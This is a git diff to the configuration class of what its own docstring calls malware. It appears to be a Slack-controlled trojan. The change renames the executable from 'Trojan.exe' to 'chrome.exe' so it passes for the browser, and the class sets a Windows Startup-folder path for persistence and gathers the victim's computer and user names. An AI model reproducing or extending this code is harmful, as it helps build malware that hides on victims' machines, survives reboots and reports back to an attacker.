@@ -6,13 +6,17 @@ from slack_bot_data import (
     SLACK_SIGNING_SECRET,
     BASE_CHANNEL_ID,
 )
+"""
+The main config file of the malware. All file paths, data about the machine and user, 
+as well as Slack connection data is saved here and is accesed by every service.
+"""
 
 class Config:
     def __init__(self):
         # File paths and unique user data
         self.__computerName = os.environ['COMPUTERNAME']
         self.__userName = getpass.getuser()
-        self.__fileName = "Trojan.exe" # In reality, "chrome.exe"
+        self.__fileName = "chrome.exe" # In reality, "chrome.exe"
         self.__filePath = f"c:\\Users\\{self.__userName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
         self.__logFileName = "log.txt"
         self.__dirlist = "dirlist.csv"
